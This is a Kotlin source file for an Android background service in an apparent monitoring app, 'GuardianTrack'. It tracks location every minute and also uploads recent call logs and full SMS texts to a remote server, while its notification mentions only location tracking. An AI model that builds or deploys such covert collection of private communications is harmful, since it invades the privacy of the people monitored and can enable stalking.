package com.example.guardiantrack

import android.app.*
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class LocationService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    private val CHANNEL_ID = "location_channel"
    private val NOTIFICATION_ID = 1

    private lateinit var repository: PendingUploadRepository
    private val gson = Gson()

    private val serviceScope = CoroutineScope(Job() + Dispatchers.IO)

    // Add NetworkChangeReceiver property
    private lateinit var networkChangeReceiver: NetworkChangeReceiver

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        repository = PendingUploadRepository(this)

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            60_000L // 1 minute interval
        ).setMinUpdateIntervalMillis(60_000L).build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let {
                    val timestamp = System.currentTimeMillis()
                    sendLocationData(it.latitude, it.longitude, timestamp)
                }
            }
        }

        startLocationUpdates(locationRequest)

        // Initialize and register NetworkChangeReceiver here
        networkChangeReceiver = NetworkChangeReceiver {
            retryPendingUploads()
        }
        val filter = IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION)
        registerReceiver(networkChangeReceiver, filter)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Retry any pending uploads each time service starts or restarts
        retryPendingUploads()

        if (hasCallLogPermission()) fetchAndSendCallLogs()
        if (hasSmsPermission()) fetchAndSendSmsLogs()

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(locationCallback)
        serviceScope.coroutineContext[Job]?.cancel()
        // Unregister the receiver to avoid leaks
        unregisterReceiver(networkChangeReceiver)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun hasCallLogPermission() =
        ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

    private fun hasSmsPermission() =
        ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

    private fun startLocationUpdates(request: LocationRequest) {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("LocationService", "Missing location permission")
            stopSelf()
            return
        }

        fusedLocationClient.requestLocationUpdates(
            request,
            locationCallback,
            Looper.getMainLooper()
        )
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
        else PendingIntent.FLAG_UPDATE_CURRENT

        @Suppress("DEPRECATION")
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, flags)

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GuardianTrack")
            .setContentText("Tracking location in background")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Location Tracking",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun sendLocationData(lat: Double, lon: Double, timestamp: Long) {
        val formattedTime = convertMillisToDateString(timestamp)

        val payload = mapOf(
            "timestamp" to formattedTime,
            "latitude" to lat,
            "longitude" to lon
        )

        val request = SheetDataRequest("location", payload)

        RetrofitClient.api.postData(request).enqueue(object : Callback<SheetDataResponse> {
            override fun onResponse(call: Call<SheetDataResponse>, response: Response<SheetDataResponse>) {
                if (response.isSuccessful) {
                    Log.d("LocationService", "Location sent: $lat, $lon at $formattedTime")
                } else {
                    Log.e("LocationService", "Failed to send location data: ${response.errorBody()?.string()}")
                    savePendingUpload(request)
                }
            }

            override fun onFailure(call: Call<SheetDataResponse>, t: Throwable) {
                Log.e("LocationService", "Error sending location data", t)
                savePendingUpload(request)
            }
        })
    }

    private fun fetchAndSendCallLogs() {
        val logs = getCallLogs(this).take(10)
        for (log in logs) {
            val payload = mapOf(
                "number" to log.number,
                "callType" to log.type,
                "timestamp" to log.timestamp,
                "duration" to log.duration.toString()
            )

            val request = SheetDataRequest("calllog", payload)

            RetrofitClient.api.postData(request).enqueue(object : Callback<SheetDataResponse> {
                override fun onResponse(call: Call<SheetDataResponse>, response: Response<SheetDataResponse>) {
                    if (response.isSuccessful) {
                        Log.d("LocationService", "Call log sent: ${log.number}")
                    } else {
                        Log.e("LocationService", "Call log failed: ${response.errorBody()?.string()}")
                        savePendingUpload(request)
                    }
                }

                override fun onFailure(call: Call<SheetDataResponse>, t: Throwable) {
                    Log.e("LocationService", "Call log error", t)
                    savePendingUpload(request)
                }
            })
        }
    }

    private fun fetchAndSendSmsLogs() {
        val logs = getSmsLogs(this).take(10)
        for (log in logs) {
            val payload = mapOf(
                "number" to log.address,
                "smsType" to log.type,
                "timestamp" to log.timestamp,
                "message" to log.body
            )
            val request = SheetDataRequest("smslog", payload)

            RetrofitClient.api.postData(request).enqueue(object : Callback<SheetDataResponse> {
                override fun onResponse(call: Call<SheetDataResponse>, response: Response<SheetDataResponse>) {
                    if (response.isSuccessful) {
                        Log.d("LocationService", "SMS log sent: ${log.address}")
                    } else {
                        Log.e("LocationService", "SMS log failed: ${response.errorBody()?.string()}")
                        savePendingUpload(request)
                    }
                }

                override fun onFailure(call: Call<SheetDataResponse>, t: Throwable) {
                    Log.e("LocationService", "SMS log error", t)
                    savePendingUpload(request)
                }
            })
        }
    }

    private fun savePendingUpload(request: SheetDataRequest) {
        serviceScope.launch {
            try {
                val pendingUpload = PendingUpload(
                    type = request.type,
                    payloadJson = gson.toJson(request.payload)
                )
                repository.insertPendingUpload(pendingUpload)
                Log.d("LocationService", "Saved pending upload: ${request.type}")
            } catch (e: Exception) {
                Log.e("LocationService", "Error saving pending upload", e)
            }
        }
    }

    fun retryPendingUploads() {
        serviceScope.launch {
            try {
                val pendingUploads = repository.getAllPendingUploads()

                if (pendingUploads.isEmpty()) {
                    Log.d("LocationService", "No pending uploads to retry.")
                    return@launch
                }

                for (pending in pendingUploads) {
                    val payloadMap: Map<String, Any> = gson.fromJson(
                        pending.payloadJson,
                        object : TypeToken<Map<String, Any>>() {}.type
                    )
                    val request = SheetDataRequest(pending.type, payloadMap)

                    val response = RetrofitClient.api.postData(request).execute()
                    if (response.isSuccessful) {
                        repository.deletePendingUpload(pending)
                        Log.d("LocationService", "Retried and deleted pending upload id: ${pending.id}")
                    } else {
                        Log.e("LocationService", "Retry failed for id: ${pending.id} with error: ${response.errorBody()?.string()}")
                    }
                }

                // ✅ Final check after retrying all
                val remaining = repository.getAllPendingUploads()
                if (remaining.isEmpty()) {
                    Log.d("LocationService", "✅ All pending uploads completed. No more retries needed.")
                } else {
                    Log.d("LocationService", "⚠️ Some uploads still pending. Will retry later.")
                }

            } catch (e: Exception) {
                Log.e("LocationService", "Error retrying pending uploads", e)
            }
        }
    }

    fun triggerRetry() {
        retryPendingUploads()
    }

}
